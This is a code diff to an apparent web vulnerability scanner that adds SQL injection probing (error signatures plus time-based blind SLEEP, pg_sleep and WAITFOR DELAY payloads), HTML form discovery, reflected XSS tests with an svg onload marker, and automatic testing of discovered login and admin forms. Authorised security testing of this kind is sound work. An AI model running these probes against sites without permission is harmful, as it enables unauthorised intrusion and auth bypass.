@@ -670,6 +670,110 @@ def _inject(url, param, value):
         parts.append(f"{k}={value}" if k == param else kv)
     return urllib.parse.urlunsplit((u.scheme, u.netloc, u.path, "&".join(parts), ""))
 
+def _post(url, data, timeout=15):
+    if not _budget_ok(): return None, {}, b""
+    hdrs = {"User-Agent": random.choice(UA_POOL), "Content-Type": "application/x-www-form-urlencoded"}
+    hdrs.update(AUTH_HEADERS)
+    req = urllib.request.Request(url, data=urllib.parse.urlencode(data).encode(), headers=hdrs)
+    try:
+        with urllib.request.urlopen(req, timeout=timeout, context=_CTX) as r:
+            return getattr(r, "status", None), dict(r.headers), r.read(300000)
+    except urllib.error.HTTPError as e:
+        try: body = e.read(300000)
+        except Exception: body = b""
+        return e.code, dict(e.headers or {}), body
+    except Exception:
+        return None, {}, b""
+
+# ---- SQL injection engine: error-based + time-based blind (DB-agnostic, any param name, GET or POST) ----
+SQL_ERR_SIGS = [b"you have an error in your sql syntax", b"warning: mysql", b"mysql_fetch",
+                b"supplied argument is not a valid mysql", b"unclosed quotation mark",
+                b"quoted string not properly terminated", b"pg_query", b"pg::syntaxerror",
+                b"sqlstate", b"ora-00933", b"ora-01756", b"sqlite3::", b"sqlite_error",
+                b"native client", b"odbc sql server driver", b"syntax error at or near"]
+# {s} = seconds. Cover MySQL (string+numeric), Postgres, MSSQL. Control uses 0s to rule out slow servers.
+SQLI_TIME_TPL = ["1' AND SLEEP({s})-- -", "1 AND SLEEP({s})", "1') AND SLEEP({s})-- -",
+                 "1';SELECT pg_sleep({s})-- -", "1' WAITFOR DELAY '0:0:{s}'-- -"]
+SQL_ERR_PROBE = "'\"`"
+
+def _timed_send(sender, payload):
+    """sender(payload) -> (status, headers, body); returns elapsed seconds or None."""
+    t0 = time.time()
+    r = sender(payload)
+    if r is None or r[0] is None and r[2] == b"": return None
+    return time.time() - t0
+
+def sqli_probe(host, label, sender, do_time=True):
+    """sender(value)->(sc,hd,body). Runs error-based always; time-based blind when do_time."""
+    # 1) error-based
+    r = sender(SQL_ERR_PROBE)
+    if r and r[2] and any(e in r[2].lower() for e in SQL_ERR_SIGS):
+        finding("crit", "sqli", host, f"‼ error-based SQL injection — {label}")
+        return True
+    if not do_time: return False
+    # 2) time-based blind: baseline fast, SLEEP(6) slow, confirm twice, control SLEEP(0) fast
+    for tpl in SQLI_TIME_TPL[:3]:
+        ctrl = _timed_send(sender, tpl.format(s=0))
+        slow = _timed_send(sender, tpl.format(s=6))
+        if ctrl is None or slow is None: continue
+        if slow - max(ctrl, 0) > 4.5:
+            slow2 = _timed_send(sender, tpl.format(s=6))
+            if slow2 and slow2 - max(ctrl, 0) > 4.5:
+                finding("crit", "sqli", host, f"‼ time-based blind SQL injection — {label} (Δ{slow:.1f}s vs {ctrl:.1f}s)")
+                return True
+    return False
+
+_sqli_lock = threading.Lock()
+_SQLI_TIME_BUDGET = [40]      # cap total time-based (5-6s each) probes so scans stay bounded
+
+# ---- HTML form discovery + POST field testing (catches login SQLi/auth-bypass + POST XSS) ----
+from html.parser import HTMLParser
+class _FormParser(HTMLParser):
+    def __init__(self):
+        super().__init__(); self.forms = []; self._cur = None
+    def handle_starttag(self, tag, attrs):
+        a = dict(attrs)
+        if tag == "form":
+            self._cur = {"action": a.get("action", ""), "method": (a.get("method") or "get").lower(), "fields": {}}
+        elif tag in ("input", "textarea", "select") and self._cur is not None:
+            name = a.get("name")
+            if name:
+                self._cur["fields"][name] = a.get("value", "") or a.get("type", "")
+    def handle_endtag(self, tag):
+        if tag == "form" and self._cur is not None:
+            self.forms.append(self._cur); self._cur = None
+
+XSS_MARK = "recon<svg/onload=1>x"
+def form_recon(page_url, host):
+    """Parse every form on the page and test each field for SQLi (POST) + reflected XSS."""
+    sc, hd, body = _get(page_url, timeout=10)
+    if not body: return
+    try:
+        p = _FormParser(); p.feed(body.decode("utf-8", "replace"))
+    except Exception:
+        return
+    for form in p.forms:
+        if not form["fields"]: continue
+        action = urllib.parse.urljoin(page_url, form["action"] or page_url)
+        if urllib.parse.urlsplit(action).netloc and host not in action: continue   # stay in scope
+        is_post = form["method"] == "post"
+        base = {k: (v if v and not v.isalpha() else "test") for k, v in form["fields"].items()}
+        for field in list(form["fields"].keys()):
+            def _snd(val, _f=field):
+                data = dict(base); data[_f] = val
+                r = _post(action, data) if is_post else _get(action + "?" + urllib.parse.urlencode(data), timeout=16)
+                return r
+            use_time = False
+            with _sqli_lock:
+                if _SQLI_TIME_BUDGET[0] > 0:
+                    _SQLI_TIME_BUDGET[0] -= 1; use_time = True
+            sqli_probe(host, f"form field '{field}' @ {action[:60]} ({'POST' if is_post else 'GET'})", _snd, do_time=use_time)
+            # reflected XSS in the form response
+            data = dict(base); data[field] = XSS_MARK
+            r = _post(action, data) if is_post else _get(action + "?" + urllib.parse.urlencode(data), timeout=10)
+            if r and r[2] and XSS_MARK.encode() in r[2]:
+                finding("high", "xss", host, f"★ reflected unescaped in form field '{field}' → {action}", action)
+
 ERR_SIGS = [b"sql syntax", b"mysql_", b"ora-0", b"odbc", b"sqlite", b"psql", b"syntax error",
             b"unterminated", b"unexpected token", b"stack trace", b"traceback (most recent",
             b"exception in thread", b"java.lang.", b"system.web", b"fatal error", b"warning: "]
@@ -875,7 +979,14 @@ def stage_vulns():
             loc = (hd.get("Location") or hd.get("location") or "").strip()
             if sc in (301, 302, 303, 307, 308) and _redirects_to(loc, "recon.example"):
                 finding("high", "open-redirect", host, f"↪ open redirect CONFIRMED — {param} -> {loc[:80]}")
-            # 5) behavioral / differential — signature-free anomaly (no fixed payload per bug)
+            # 5) SQL injection — error-based always, time-based blind within a bounded budget
+            def _snd(v): return _get(_inject(url, param, urllib.parse.quote(v)), timeout=16)
+            use_time = False
+            with _sqli_lock:
+                if _SQLI_TIME_BUDGET[0] > 0:
+                    _SQLI_TIME_BUDGET[0] -= 1; use_time = True
+            sqli_probe(host, f"{param} @ {url[:60]} (GET)", _snd, do_time=use_time)
+            # 6) behavioral / differential — signature-free anomaly (no fixed payload per bug)
             anomaly_probe(url, param, host)
     th = []
     for (url, param) in tasks:
@@ -1102,6 +1213,7 @@ def stage_brain():
                 if LOGIN_RE.search(body):
                     login = True
                     feed(f"🔑 login form on {host} — auth / default-creds candidate", "med", host)
+                    if A.test: form_recon(url, host)     # test the login form for SQLi/auth-bypass/XSS
             ctype = str(hd.get("Content-Type", "")).lower()
             if "json" in ctype or "graphql" in url.lower() or "/api" in url.lower():
                 api = True
@@ -1116,7 +1228,10 @@ def stage_brain():
             for d in hd0.get("dirs", []):
                 p = d.get("path", "")
                 if p and (p.endswith("/") or INTERESTING_PATH.search(p)):
-                    exposure_checks(urllib.parse.urljoin(url, p), host); checked += 1
+                    cu = urllib.parse.urljoin(url, p)
+                    exposure_checks(cu, host); checked += 1
+                    if A.test and _re.search(r"(login|admin|index|dashboard|signin|auth)", p, _re.I):
+                        form_recon(cu, host)             # login/admin pages found by dir-brute → test their forms
                 if checked >= 15: break
             tech = " ".join(STATE["hosts"].get(host, {}).get("tech", [])).lower()
             if "wordpress" in tech: run_nuclei_tags(url, host, "wordpress")
